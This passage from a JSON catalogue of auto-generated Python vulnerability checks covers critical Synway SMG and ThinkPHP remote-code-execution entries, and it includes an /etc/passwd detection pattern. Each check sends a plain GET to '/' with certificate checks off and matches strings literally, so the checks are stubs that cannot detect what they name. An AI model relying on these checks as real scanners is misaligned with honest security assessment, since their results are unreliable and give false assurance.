        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sanhuismg-radius-rce\nName: Synway SMG Gateway 9-2radius.php - Remote Command Execution\nSeverity: critical\nDescription: Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php, where the radius_address parameter is passed to a system() call without sanitization. This allows unauthenticated attackers to execute arbitrary commands on the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sanhuismg_radius_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sanhuismg-radius-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Synway SMG Gateway 9-2radius.php - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] regex ['root:.*:0:0:']\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Synway SMG Gateway 9-2radius.php - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sanhuismg_radius_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "rce",
          "synway",
          "gateway",
          "unauth"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_thinkphp_2_rce",
        "name": "ThinkPHP 2/3 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'PHP Extension, PHP Version, ThinkPHP' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp-2-rce\nName: ThinkPHP 2/3 - Remote Code Execution\nSeverity: critical\nDescription: ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp_2_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp-2-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 2/3 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'PHP Extension, PHP Version, ThinkPHP' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['PHP Extension, PHP Version, ThinkPHP']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 2/3 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp_2_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp-2-rce\nName: ThinkPHP 2/3 - Remote Code Execution\nSeverity: critical\nDescription: ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp_2_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp-2-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 2/3 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'PHP Extension, PHP Version, ThinkPHP' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['PHP Extension, PHP Version, ThinkPHP']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 2/3 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp_2_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "thinkphp",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_thinkphp_5023_rce",
        "name": "ThinkPHP 5.0.23 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'PHP Extension, PHP Version, ThinkPHP' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp-5023-rce\nName: ThinkPHP 5.0.23 - Remote Code Execution\nSeverity: critical\nDescription: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp_5023_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp-5023-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 5.0.23 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'PHP Extension, PHP Version, ThinkPHP' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['PHP Extension, PHP Version, ThinkPHP']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 5.0.23 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp_5023_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp-5023-rce\nName: ThinkPHP 5.0.23 - Remote Code Execution\nSeverity: critical\nDescription: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp_5023_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp-5023-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 5.0.23 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'PHP Extension, PHP Version, ThinkPHP' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['PHP Extension, PHP Version, ThinkPHP']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 5.0.23 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp_5023_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "thinkphp",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_thinkphp_509_information_disclosure",
        "name": "ThinkPHP 5.0.9 - Information Disclosure",
        "language": "Python",
        "famille": "WebApp",
        "description": "ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'SQLSTATE, XPATH syntax error' | status HTTP [500]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
